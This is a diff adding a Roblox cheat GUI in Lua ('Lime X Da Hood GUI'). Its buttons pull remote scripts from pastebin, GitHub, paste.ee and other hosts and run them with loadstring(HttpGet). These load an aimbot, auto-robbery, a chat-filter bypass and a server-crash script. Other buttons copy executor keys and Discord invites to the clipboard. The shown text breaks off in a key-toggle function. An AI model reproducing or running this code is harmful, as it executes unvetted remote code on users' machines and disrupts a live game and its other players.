@@ -1,0 +1,825 @@
+if game.PlaceId == 2788229376 then 
+
+
+
+
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local Extra = Instance.new("Frame")
+local TextButton_2 = Instance.new("TextButton")
+local TextButton_3 = Instance.new("TextButton")
+local TextButton_4 = Instance.new("TextButton")
+local TextButton_5 = Instance.new("TextButton")
+local TextButton_6 = Instance.new("TextButton")
+local TextButton_7 = Instance.new("TextButton")
+local TextButton_8 = Instance.new("TextButton")
+local TextButton_9 = Instance.new("TextButton")
+local TextButton_10 = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local S = Instance.new("TextButton")
+local TextLabel_3 = Instance.new("TextLabel")
+local TextButton_11 = Instance.new("TextButton")
+local G = Instance.new("TextButton")
+local Scripts = Instance.new("Frame")
+local TextButton_12 = Instance.new("TextButton")
+local TextButton_13 = Instance.new("TextButton")
+local TextButton_14 = Instance.new("TextButton")
+local TextButton_15 = Instance.new("TextButton")
+local TextButton_16 = Instance.new("TextButton")
+local TextButton_17 = Instance.new("TextButton")
+local GUI = Instance.new("Frame")
+local TextButton_18 = Instance.new("TextButton")
+local TextButton_19 = Instance.new("TextButton")
+local TextButton_20 = Instance.new("TextButton")
+local TextButton_21 = Instance.new("TextButton")
+local TextButton_22 = Instance.new("TextButton")
+local TextButton_23 = Instance.new("TextButton")
+local TextButton_24 = Instance.new("TextButton")
+local TextButton_25 = Instance.new("TextButton")
+local TextButton_26 = Instance.new("TextButton")
+local TextLabel_4 = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+Frame.BorderColor3 = Color3.fromRGB(85, 255, 0)
+Frame.BorderSizePixel = 2
+Frame.Position = UDim2.new(0.136659369, 0, 0.136436597, 0)
+Frame.Size = UDim2.new(0, 558, 0, 357)
+Frame.Active = true
+Frame.Draggable = true
+
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(5.96046448e-08, 0, 0.117647052, 0)
+TextLabel.Size = UDim2.new(0, 557, 0, 2)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = ""
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton.Position = UDim2.new(0.676231384, 0, 0.161723003, 0)
+TextButton.Size = UDim2.new(0, 167, 0, 45)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Extra"
+TextButton.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+Extra.Name = "Extra"
+Extra.Parent = Frame
+Extra.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+Extra.BackgroundTransparency = 3.000
+Extra.BorderColor3 = Color3.fromRGB(85, 255, 0)
+Extra.BorderSizePixel = 2
+Extra.Position = UDim2.new(0, 0, 0.333333343, 0)
+Extra.Size = UDim2.new(0, 557, 0, 238)
+Extra.Visible = false
+
+TextButton_2.Parent = Extra
+TextButton_2.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_2.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_2.Position = UDim2.new(0.676066101, 0, 0.557865798, 0)
+TextButton_2.Size = UDim2.new(0, 167, 0, 45)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "Good Graphics"
+TextButton_2.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_2.TextSize = 30.000
+TextButton_2.TextWrapped = true
+TextButton_2.MouseButton1Down:connect(function()
+
+print ("E")
+end)
+
+TextButton_3.Parent = Extra
+TextButton_3.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_3.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_3.Position = UDim2.new(0.349315643, 0, 0.557865798, 0)
+TextButton_3.Size = UDim2.new(0, 167, 0, 45)
+TextButton_3.Font = Enum.Font.SourceSans
+TextButton_3.Text = "Fps Booster"
+TextButton_3.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_3.TextScaled = true
+TextButton_3.TextSize = 14.000
+TextButton_3.TextWrapped = true
+TextButton_3.MouseButton1Down:connect(function()
+	local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
+	local g = game
+	local w = g.Workspace
+	local l = g.Lighting
+	local t = w.Terrain
+	sethiddenproperty(l,"Technology",2)
+	sethiddenproperty(t,"Decoration",false)
+	t.WaterWaveSize = 0
+	t.WaterWaveSpeed = 0
+	t.WaterReflectance = 0
+	t.WaterTransparency = 0
+	l.GlobalShadows = false
+	l.FogEnd = 9e9
+	l.Brightness = 0
+	settings().Rendering.QualityLevel = "Level01"
+	for i, v in pairs(g:GetDescendants()) do
+		if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+			v.Material = "Plastic"
+			v.Reflectance = 0
+		elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+			v.Transparency = 1
+		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+			v.Lifetime = NumberRange.new(0)
+		elseif v:IsA("Explosion") then
+			v.BlastPressure = 1
+			v.BlastRadius = 1
+		elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
+			v.Enabled = false
+		elseif v:IsA("MeshPart") then
+			v.Material = "Plastic"
+			v.Reflectance = 0
+			v.TextureID = 10385902758728957
+		end
+	end
+	for i, e in pairs(l:GetChildren()) do
+		if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+			e.Enabled = false
+		end
+	end
+	end)
+
+TextButton_4.Parent = Extra
+TextButton_4.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_4.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_4.Position = UDim2.new(0.676066101, 0, 0.305764914, 0)
+TextButton_4.Size = UDim2.new(0, 167, 0, 45)
+TextButton_4.Font = Enum.Font.SourceSans
+TextButton_4.Text = "Chat Bypass"
+TextButton_4.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_4.TextScaled = true
+TextButton_4.TextSize = 14.000
+TextButton_4.TextWrapped = true
+TextButton_4.MouseButton1Down:connect(function()
+	local function callback(Text)
+		if Text == "Swear Word GUI" then
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/bedra45/chetbypasser/main/chetbypass'))()
+		elseif Text == ("Custom") then
+			loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
+		end
+	end
+
+
+	local NotificationBindable = Instance.new("BindableFunction")
+	NotificationBindable.OnInvoke = callback
+	--
+	game.StarterGui:SetCore("SendNotification",  {
+		Title = "Witch version would you like?";
+		Text = "Please Choose";
+		Icon = "";
+		Duration = 10;
+		Button1 = "Swear Word GUI";
+		Button2 = "Custom";
+		Callback = NotificationBindable;
+	})
+end)
+
+TextButton_5.Parent = Extra
+TextButton_5.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_5.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_5.Position = UDim2.new(0.349315643, 0, 0.305764914, 0)
+TextButton_5.Size = UDim2.new(0, 167, 0, 45)
+TextButton_5.Font = Enum.Font.SourceSans
+TextButton_5.Text = "Audio Logger"
+TextButton_5.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_5.TextScaled = true
+TextButton_5.TextSize = 14.000
+TextButton_5.TextWrapped = true
+TextButton_5.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/GmbrsEjM'),true))()
+
+end)
+
+
+
+TextButton_6.Parent = Extra
+TextButton_6.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_6.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_6.Position = UDim2.new(0.349315643, 0, 0.053664051, 0)
+TextButton_6.Size = UDim2.new(0, 167, 0, 45)
+TextButton_6.Font = Enum.Font.SourceSans
+TextButton_6.Text = "Infinite Yield"
+TextButton_6.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_6.TextSize = 35.000
+TextButton_6.TextWrapped = true
+TextButton_6.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()	
+end)
+
+TextButton_7.Parent = Extra
+TextButton_7.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_7.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_7.Position = UDim2.new(0.022565173, 0, 0.305764914, 0)
+TextButton_7.Size = UDim2.new(0, 167, 0, 45)
+TextButton_7.Font = Enum.Font.SourceSans
+TextButton_7.Text = "Animation Changer"
+TextButton_7.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_7.TextScaled = true
+TextButton_7.TextSize = 14.000
+TextButton_7.TextWrapped = true
+TextButton_7.MouseButton1Down:connect(function()
+	teclaopen = "M" ---Cambia la tecla, por la que gustes para cerrar la GUI
+
+	loadstring(game:HttpGet("https://god-x.000webhostapp.com/linkAnimatorEdit.lua", true))()
+end)
+
+TextButton_8.Parent = Extra
+TextButton_8.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_8.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_8.Position = UDim2.new(0.022565173, 0, 0.557865798, 0)
+TextButton_8.Size = UDim2.new(0, 167, 0, 45)
+TextButton_8.Font = Enum.Font.SourceSans
+TextButton_8.Text = "Server Hop"
+TextButton_8.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_8.TextScaled = true
+TextButton_8.TextSize = 14.000
+TextButton_8.TextWrapped = true
+TextButton_8.MouseButton1Down:connect(function()
+	wait(0.3)
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Lime X";
+		Text = "Finding New Server ";
+	})
+
+	local x = {}
+	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
+		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
+			x[#x + 1] = v.id
+		end
+	end
+	if #x > 0 then
+		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
+	else
+		return game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "Lime X!";
+			Text = "Server Hop failed ";
+		})
+	end
+end)
+
+TextButton_9.Parent = Extra
+TextButton_9.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_9.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_9.Position = UDim2.new(0.022565173, 0, 0.053664051, 0)
+TextButton_9.Size = UDim2.new(0, 167, 0, 45)
+TextButton_9.Font = Enum.Font.SourceSans
+TextButton_9.Text = "Trash God Mode"
+TextButton_9.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_9.TextScaled = true
+TextButton_9.TextSize = 14.000
+TextButton_9.TextWrapped = true
+TextButton_9.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/Udcv5jkk", true))()
+
+end)
+
+
+TextButton_10.Parent = Extra
+TextButton_10.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_10.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_10.Position = UDim2.new(0.676066041, 0, 0.053664051, 0)
+TextButton_10.Size = UDim2.new(0, 167, 0, 45)
+TextButton_10.Font = Enum.Font.SourceSans
+TextButton_10.Text = "Ctrl Delete"
+TextButton_10.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_10.TextScaled = true
+TextButton_10.TextSize = 14.000
+TextButton_10.TextWrapped = true
+TextButton_10.MouseButton1Down:connect(function()
+	local Plr = game:GetService("Players").LocalPlayer
+	local Mouse = Plr:GetMouse()
+
+	Mouse.Button1Down:connect(function()
+		if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then return end
+		if not Mouse.Target then return end
+		Mouse.Target:Destroy()
+	end)
+end)
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(5.96046448e-08, 0, 0.876750708, 0)
+TextLabel_2.Size = UDim2.new(0, 557, 0, 2)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = ""
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 14.000
+
+S.Name = "S"
+S.Parent = Frame
+S.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+S.BorderColor3 = Color3.fromRGB(85, 255, 0)
+S.Position = UDim2.new(0.349621058, 0, 0.162907749, 0)
+S.Size = UDim2.new(0, 167, 0, 45)
+S.Font = Enum.Font.SourceSans
+S.Text = "Options"
+S.TextColor3 = Color3.fromRGB(85, 255, 0)
+S.TextScaled = true
+S.TextSize = 14.000
+S.TextWrapped = true
+
+TextLabel_3.Parent = Frame
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextLabel_3.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextLabel_3.BorderSizePixel = 0
+TextLabel_3.Size = UDim2.new(0, 557, 0, 42)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Lime X Da Hood GUI"
+TextLabel_3.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+TextButton_11.Parent = Frame
+TextButton_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_11.BackgroundTransparency = 3.000
+TextButton_11.Position = UDim2.new(0.259856582, 0, 0.859943986, 0)
+TextButton_11.Size = UDim2.new(0, 267, 0, 50)
+TextButton_11.Font = Enum.Font.SourceSans
+TextButton_11.Text = "@RobloxLegoCheats"
+TextButton_11.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_11.TextSize = 34.000
+
+G.Name = "G"
+G.Parent = Frame
+G.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+G.BorderColor3 = Color3.fromRGB(85, 255, 0)
+G.Position = UDim2.new(0.022565173, 0, 0.162907749, 0)
+G.Size = UDim2.new(0, 167, 0, 45)
+G.Font = Enum.Font.SourceSans
+G.Text = "Gui's"
+G.TextColor3 = Color3.fromRGB(85, 255, 0)
+G.TextScaled = true
+G.TextSize = 14.000
+G.TextWrapped = true
+
+Scripts.Name = "Scripts"
+Scripts.Parent = Frame
+Scripts.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+Scripts.BackgroundTransparency = 3.000
+Scripts.BorderColor3 = Color3.fromRGB(85, 255, 0)
+Scripts.BorderSizePixel = 2
+Scripts.Position = UDim2.new(0, 0, 0.333333343, 0)
+Scripts.Size = UDim2.new(0, 557, 0, 238)
+Scripts.Visible = false
+
+TextButton_12.Parent = Scripts
+TextButton_12.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_12.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_12.Position = UDim2.new(0.676066101, 0, 0.444420367, 0)
+TextButton_12.Size = UDim2.new(0, 167, 0, 66)
+TextButton_12.Font = Enum.Font.SourceSans
+TextButton_12.Text = "AutoRobb"
+TextButton_12.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_12.TextSize = 28.000
+TextButton_12.TextWrapped = true
+TextButton_12.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/74VJ07iY", true))()
+	wait (3)	
+	loadstring(game:HttpGet("https://pastebin.com/raw/apwUGt9q", true))()
+end)
+
+TextButton_13.Parent = Scripts
+TextButton_13.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_13.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_13.Position = UDim2.new(0.676066101, 0, 0.0536640696, 0)
+TextButton_13.Size = UDim2.new(0, 167, 0, 66)
+TextButton_13.Font = Enum.Font.SourceSans
+TextButton_13.Text = "Copy Polakya Key"
+TextButton_13.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_13.TextSize = 26.000
+TextButton_13.TextWrapped = true
+TextButton_13.MouseButton1Down:connect(function()
+
+setclipboard("EFQF1F1F1WFFFDSKFKW0DF12K0F0FV0SKF0SLDSJDISJIDISJD29I91I91IKDO")
+
+local function callback(Text)
+	if Text == "Okay" then
+		print ("Answer")
+	elseif Text == ("Copy Invite") then
+		setclipboard ("https://discord.gg/NqXd8eEM ")	
+	end
+end
+
+local NotificationBindable = Instance.new("BindableFunction")
+NotificationBindable.OnInvoke = callback
+--
+game.StarterGui:SetCore("SendNotification",  {
+	Title = "Polakya Key";
+	Text = "I Have Attempted To Give you the key , Simply Paste it , If its wrong im sorry you will have to join there discord for the key.";
+	Icon = "";
+	Duration = 20;
+	Button1 = "Okay";
+	Button2 = "Copy Invite";
+	Callback = NotificationBindable;
+})
+
+end)
+
+
+
+TextButton_14.Parent = Scripts
+TextButton_14.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_14.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_14.Position = UDim2.new(0.022565186, 0, 0.444420367, 0)
+TextButton_14.Size = UDim2.new(0, 167, 0, 66)
+TextButton_14.Font = Enum.Font.SourceSans
+TextButton_14.Text = "Crash Server"
+TextButton_14.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_14.TextSize = 28.000
+TextButton_14.TextWrapped = true
+TextButton_14.MouseButton1Down:connect(function()
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "Lime X";
+	Text = "Crashing... Please Wait , You're Game Will Freeze.";
+})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/racemodex/my-scripts/master/crashserverdh", true))()
+end)
+
+TextButton_15.Parent = Scripts
+TextButton_15.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_15.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_15.Position = UDim2.new(0.349315643, 0, 0.444420367, 0)
+TextButton_15.Size = UDim2.new(0, 167, 0, 66)
+TextButton_15.Font = Enum.Font.SourceSans
+TextButton_15.Text = "Aimbot"
+TextButton_15.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_15.TextSize = 28.000
+TextButton_15.TextWrapped = true
+TextButton_15.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/wfwf/main/aimbot"))()
+
+end)
+
+
+TextButton_16.Parent = Scripts
+TextButton_16.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_16.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_16.Position = UDim2.new(0.349315643, 0, 0.0536640696, 0)
+TextButton_16.Size = UDim2.new(0, 167, 0, 66)
+TextButton_16.Font = Enum.Font.SourceSans
+TextButton_16.Text = "Copy Zordion Key"
+TextButton_16.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_16.TextSize = 26.000
+TextButton_16.TextWrapped = true
+TextButton_16.MouseButton1Down:connect(function()
+	local function callback(Text)
+		if Text == "Okay" then
+			print ("Answer")
+		elseif Text == ("Copy Invite") then
+			setclipboard ("https://discord.gg/xkfQDxdMjq")	
+		end
+	end
+
+	local NotificationBindable = Instance.new("BindableFunction")
+	NotificationBindable.OnInvoke = callback
+	--
+	game.StarterGui:SetCore("SendNotification",  {
+		Title = "Zordion Key";
+		Text = "I Have Attempted To Give you the key , Simply Paste it , If its wrong im sorry you will have to join there discord for the key.";
+		Icon = "";
+		Duration = 20;
+		Button1 = "Okay";
+		Button2 = "Copy Invite";
+		Callback = NotificationBindable;
+	})
+	setclipboard ("zordioniscool")
+end)
+
+
+
+TextButton_17.Parent = Scripts
+TextButton_17.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_17.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_17.Position = UDim2.new(0.0225651748, 0, 0.0536640696, 0)
+TextButton_17.Size = UDim2.new(0, 167, 0, 66)
+TextButton_17.Font = Enum.Font.SourceSans
+TextButton_17.Text = "Copy Legacy X Key"
+TextButton_17.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_17.TextSize = 26.000
+TextButton_17.TextWrapped = true
+TextButton_17.MouseButton1Down:connect(function()
+local function callback(Text)
+	if Text == "Okay" then
+		print ("Answer")
+	elseif Text == ("Copy Invite") then
+		setclipboard ("https://discord.gg/4FtJtC47G2")	
+	end
+end
+
+local NotificationBindable = Instance.new("BindableFunction")
+NotificationBindable.OnInvoke = callback
+--
+game.StarterGui:SetCore("SendNotification",  {
+	Title = "Legacy X Key";
+	Text = "I Have Attempted To Give you the key , Simply Paste it , If its wrong im sorry you will have to join there discord for the key.";
+	Icon = "";
+	Duration = 20;
+	Button1 = "Okay";
+	Button2 = "Copy Invite";
+	Callback = NotificationBindable;
+})
+
+setclipboard("2e7d24d6b518921162898fb4d74e12dfef788fcf042711022df42fb0f786bc93")
+end)
+
+GUI.Name = "GUI"
+GUI.Parent = Frame
+GUI.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+GUI.BackgroundTransparency = 3.000
+GUI.BorderColor3 = Color3.fromRGB(85, 255, 0)
+GUI.BorderSizePixel = 2
+GUI.Position = UDim2.new(0, 0, 0.333333343, 0)
+GUI.Size = UDim2.new(0, 557, 0, 238)
+GUI.Visible = false
+
+TextButton_18.Parent = GUI
+TextButton_18.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_18.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_18.Position = UDim2.new(0.349315643, 0, 0.305764914, 0)
+TextButton_18.Size = UDim2.new(0, 167, 0, 45)
+TextButton_18.Font = Enum.Font.SourceSans
+TextButton_18.Text = "Krypt"
+TextButton_18.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_18.TextScaled = true
+TextButton_18.TextSize = 14.000
+TextButton_18.TextWrapped = true
+TextButton_18.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/krypt/main/kryptx"))()
+
+end)
+
+TextButton_19.Parent = GUI
+TextButton_19.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_19.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_19.Position = UDim2.new(0.022565173, 0, 0.305764914, 0)
+TextButton_19.Size = UDim2.new(0, 167, 0, 45)
+TextButton_19.Font = Enum.Font.SourceSans
+TextButton_19.Text = "Raycode X"
+TextButton_19.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_19.TextScaled = true
+TextButton_19.TextSize = 14.000
+TextButton_19.TextWrapped = true
+TextButton_19.MouseButton1Down:connect(function()
+
+loadstring(game:GetObjects("rbxassetid://5812737894")[1].Source)()
+
+end)
+
+
+
+TextButton_20.Parent = GUI
+TextButton_20.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_20.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_20.Position = UDim2.new(0.676066101, 0, 0.305764914, 0)
+TextButton_20.Size = UDim2.new(0, 167, 0, 45)
+TextButton_20.Font = Enum.Font.SourceSans
+TextButton_20.Text = "Zordion"
+TextButton_20.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_20.TextScaled = true
+TextButton_20.TextSize = 14.000
+TextButton_20.TextWrapped = true
+TextButton_20.MouseButton1Down:connect(function()
+	--------------works with  krnl api only ):
+	--------------THE KEY IS zordrioniscool
+	loadstring(game:HttpGet("https://pastebin.com/raw/wKg0DVLC", true))()
+
+
+end)
+
+TextButton_21.Parent = GUI
+TextButton_21.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_21.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_21.Position = UDim2.new(0.349315643, 0, 0.053664051, 0)
+TextButton_21.Size = UDim2.new(0, 167, 0, 45)
+TextButton_21.Font = Enum.Font.SourceSans
+TextButton_21.Text = "Polakya"
+TextButton_21.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_21.TextScaled = true
+TextButton_21.TextSize = 14.000
+TextButton_21.TextWrapped = true
+TextButton_21.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/pixelheadx/Polakya/main/Bestscript.md"))();
+
+end)
+
+
+TextButton_22.Parent = GUI
+TextButton_22.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_22.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_22.Position = UDim2.new(0.676066041, 0, 0.053664051, 0)
+TextButton_22.Size = UDim2.new(0, 167, 0, 45)
+TextButton_22.Font = Enum.Font.SourceSans
+TextButton_22.Text = "Croa Hub"
+TextButton_22.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_22.TextScaled = true
+TextButton_22.TextSize = 14.000
+TextButton_22.TextWrapped = true
+TextButton_22.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/3zMt8VPZ", true))()
+end)
+
+TextButton_23.Parent = GUI
+TextButton_23.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_23.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_23.Position = UDim2.new(0.349315643, 0, 0.557865798, 0)
+TextButton_23.Size = UDim2.new(0, 167, 0, 45)
+TextButton_23.Font = Enum.Font.SourceSans
+TextButton_23.Text = "Rayzor X"
+TextButton_23.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_23.TextScaled = true
+TextButton_23.TextSize = 14.000
+TextButton_23.TextWrapped = true
+TextButton_23.MouseButton1Down:connect(function()
+
+	loadstring(game:HttpGet("https://paste.ee/r/0R3sZ/0", true))()
+
+end)
+
+
+TextButton_24.Parent = GUI
+TextButton_24.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_24.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_24.Position = UDim2.new(0.676066101, 0, 0.557865798, 0)
+TextButton_24.Size = UDim2.new(0, 167, 0, 45)
+TextButton_24.Font = Enum.Font.SourceSans
+TextButton_24.Text = "DH Hub"
+TextButton_24.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_24.TextScaled = true
+TextButton_24.TextSize = 14.000
+TextButton_24.TextWrapped = true
+TextButton_24.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Manny72911/Da-Hood-Hub-/main/da%20hood%20hub",true))();
+
+end)
+
+TextButton_25.Parent = GUI
+TextButton_25.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_25.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_25.Position = UDim2.new(0.022565173, 0, 0.557865798, 0)
+TextButton_25.Size = UDim2.new(0, 167, 0, 45)
+TextButton_25.Font = Enum.Font.SourceSans
+TextButton_25.Text = "HoodShark"
+TextButton_25.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_25.TextScaled = true
+TextButton_25.TextSize = 14.000
+TextButton_25.TextWrapped = true
+TextButton_25.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://paste.ee/r/2Buxn/0", true))()
+end)
+
+
+TextButton_26.Parent = GUI
+TextButton_26.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+TextButton_26.BorderColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_26.Position = UDim2.new(0.022565173, 0, 0.053664051, 0)
+TextButton_26.Size = UDim2.new(0, 167, 0, 45)
+TextButton_26.Font = Enum.Font.SourceSans
+TextButton_26.Text = "Legacy X"
+TextButton_26.TextColor3 = Color3.fromRGB(85, 255, 0)
+TextButton_26.TextScaled = true
+TextButton_26.TextSize = 14.000
+TextButton_26.TextWrapped = true
+TextButton_26.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Compwnter/LegacyX/main/script.lua'), true))()
+
+end)
+
+TextLabel_4.Parent = Frame
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
+TextLabel_4.BorderSizePixel = 0
+TextLabel_4.Position = UDim2.new(5.96046448e-08, 0, 0.327731073, 0)
+TextLabel_4.Size = UDim2.new(0, 557, 0, 2)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = ""
+TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.TextSize = 14.000
+
+-- Scripts:
+
+---------------this is toggle gui script 
+local function MLNJ_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+ 
+	local frame = script.Parent -- path to the frame
+	local mouse = game:GetService('Players').LocalPlayer:GetMouse(); -- we need the mouse object, which also has the keyboard
+ 
+	mouse.KeyDown:connect(function(key) -- whenever a key is pushed down
+		key = key:lower() -- i do this in all my key events, though i don't remember why
+		if key == 'p' then -- if key pressed is h
